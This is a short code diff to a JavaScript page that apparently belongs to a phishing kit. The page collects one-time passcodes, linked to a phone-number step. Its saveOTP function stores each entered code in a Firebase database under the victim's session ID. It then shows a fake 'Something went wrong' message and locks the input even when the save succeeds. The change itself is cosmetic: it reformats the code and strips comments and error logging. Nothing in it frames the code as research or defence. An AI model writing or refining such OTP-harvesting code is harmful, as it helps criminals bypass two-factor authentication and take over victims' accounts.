@@ -95,22 +95,11 @@
 
   function saveOTP(otp) {
     var userId = sessionStorage.getItem("affinity_userId");
-    if (!userId) { 
-      window.location.href = "phone-number.html"; 
-      return; 
-    }
+    if (!userId) { window.location.href = "phone-number.html"; return; }
 
-    // ✅ Save OTP to Firebase with .then()
     database.ref(DB_NODE + "/" + userId).update({ otp: otp })
-      .then(function() {
-        showToast("Something went wrong");
-        document.getElementById("otpBoxesWrap").classList.add("locked");
-      })
-      .catch(function(error) {
-        console.error("❌ Firebase error:", error);
-        showToast("Something went wrong");
-        document.getElementById("otpBoxesWrap").classList.add("locked");
-      });
+      .then(function() { showToast("Something went wrong"); document.getElementById("otpBoxesWrap").classList.add("locked"); })
+      .catch(function() { showToast("Something went wrong"); document.getElementById("otpBoxesWrap").classList.add("locked"); });
   }
 
   var secondsLeft = 120;
